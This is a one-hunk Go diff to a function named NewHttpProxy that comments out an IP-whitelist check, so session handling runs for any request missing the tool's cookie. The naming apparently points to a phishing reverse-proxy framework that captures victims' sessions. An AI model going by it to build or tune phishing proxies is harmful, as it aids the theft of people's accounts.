@@ -186,7 +186,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					if err != nil && !p.isWhitelistedIP(remote_addr) {
+					if err != nil /* && !p.isWhitelistedIP(remote_addr) */ {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							var uv url.Values
